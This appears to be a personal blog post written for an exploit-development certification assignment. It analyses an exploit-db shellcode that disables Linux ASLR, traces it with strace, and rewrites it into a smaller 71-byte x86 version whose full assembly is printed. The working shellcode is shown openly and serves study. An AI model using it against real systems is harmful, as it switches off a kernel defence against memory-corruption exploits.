---
layout: post
title: "Linux/x86 - Disable ASLR Shellcode (71 bytes)"
date: 2017-05-07 12:00:00
share: true
comments: true
tags: [Exploit Development, Shellcoding, SLAE, OSCE Prep]
---

_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)._
_**Student ID:** SLAE-885_
_**Assignment number:** 6.1_
_**Github repo:** <https://github.com/abatchy17/SLAE>_  

---

**_Note_: A modified version has been published in exploit-db:[ https://www.exploit-db.com/exploits/41969/](https://www.exploit-db.com/exploits/41969/) (calls setruid first)**  
  
In assignment 6, the requirement is polymorphing 3+ shellcodes off shellstorm.org or exploit-db.com_, _which basically means modifying the code so it doesn't look like the original yet has the same functionality. This is the first post out of three.  
  
  

## Linux/x86 - Disable ASLR Shellcode (71 bytes)

First shellcode I will dissect is a disable ASLR one by Mohammad Reza Ramezani, shellcode can be found [here](https://www.exploit-db.com/exploits/36637/).  
  
Let's compile this code and instead of debugging it, we'll use strace tool  

```console
abatchy@ubuntu:~/Desktop/workspace$ gcc 36637.c -fno-stack-protector -z execstack -o 36637.out  
abatchy@ubuntu:~/Desktop/workspace$ sudo su  
root@ubuntu:/home/abatchy/Desktop/workspace# strace ./36637.out   
execve("./36637.out", ["./36637.out"], [/* 26 vars */]) = 0  
brk(0)                                  = 0x804b000  
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)  
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd8000  
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)  
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3  
fstat64(3, {st_mode=S_IFREG|0644, st_size=79136, ...}) = 0  
mmap2(NULL, 79136, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fc4000  
close(3)                                = 0  
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)  
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3  
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0P\234\1\0004\0\0\0"..., 512) = 512  
fstat64(3, {st_mode=S_IFREG|0755, st_size=1763068, ...}) = 0  
mmap2(NULL, 1768060, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e14000  
mmap2(0xb7fbe000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1aa000) = 0xb7fbe000  
mmap2(0xb7fc1000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fc1000  
close(3)                                = 0  
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e13000  
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e13940, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0  
mprotect(0xb7fbe000, 8192, PROT_READ)   = 0  
mprotect(0x8049000, 4096, PROT_READ)    = 0  
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0  
munmap(0xb7fc4000, 79136)               = 0  
**open("/proc/sys/kernel/randomize_va_space", O_RDWR) = 3  
write(3, "0\n", 2)                      = 2  
_exit(0)                                = ?**  
+++ exited with 0 +++  
```
**_Note_: DO NOT run code directly without investigating it first and making sure
it's totally safe (I did).  
  
So 3 calls are what matter to us:  
  
1. `open("/proc/sys/kernel/randomize_va_space", O_RDWR)`  
2. `write(3, "0\n", 2)`
3. `exit(0)`  
  
There seem to be room for improvement, so let's see if we can make this code significantly smaller.  

## 1\. `open("/proc/sys/kernel/randomize_va_space", O_RDWR)`

  
Minor refactoring:
```nasm
xor eax,eax  
jmp filename  
shellcode:  
pop ebx         ; EBX now points to '/proc/sys/kernel/randomize_va_spaceX'  
mov byte [ebx + 35],al  
push byte 5  
pop eax  
push byte 2  
pop ecx  
int 80h  
```    

We don't need `O_RDWR` permissions, but I tried making use of that with no avail.  
  

## 2\. `write(fd, "0\n", 2)`

  
1\. `mov ebx, eax`: Since we don't care about EAX, `xchg eax,ebx` is one byte less.  
  
2\. `push byte 2 - pop edx`: ECX already contains 2, let's exchange them instead.  
  
3\. `jmp-call-pop`: Got rid of it and replaced it with a push '0'.  
  
```nasm
xchg eax, ebx   ; One byte less than mov ebx, eax  
push byte 4  
pop eax  
xchg ecx, edx   ; ECX already contains 2  
push byte 0x30  
mov ecx, esp    ; ECX now points to "0"  
int 80h         ; EAX will now contains 1  
```

## 3\. `exit(0)`

Is it a big deal exiting with non-zero status? Not really, so let's not nullify EBX (it currently contains the file descriptor).  
  
Can we do better? Yes! `write()` returns number of bytes written, which should be 1 (we only wrote "0"), so we can exit directly!  

```nasm
int 80h         ; Yep, that's it  
```

## Final shellcode

```nasm
section .text  
global _start  
  
_start:  
  
;  
; open("/proc/sys/kernel/randomize_va_spaceX", O_RDWR)  
;  
xor eax,eax  
jmp aslr_file  
shellcode:  
pop ebx         ; EBX now points to '/proc/sys/kernel/randomize_va_spaceX'  
mov byte [ebx + 35],al  
push byte 5  
pop eax  
push byte 2  
pop ecx  
int 80h  
  
;  
; write(fd, '0', 1)  
;  
xchg eax, ebx   ; One byte less than mov ebx, eax  
push byte 4  
pop eax  
xchg ecx, edx   ; ECX already contains 2  
push byte 0x30  
mov ecx, esp    ; ECX now points to "0"  
int 80h         ; EAX will now contains 1  
  
;  
; exit(0)  
;  
int 80h         ; Yep, that's it  
  
aslr_file:  
call shellcode  ; Skips the filename and avoids using JMP  
db '/proc/sys/kernel/randomize_va_spaceX'  
``` 

Shellcode size has been cut down to 71 bytes (13 bytes less than original code).  
  
\- Abatchy

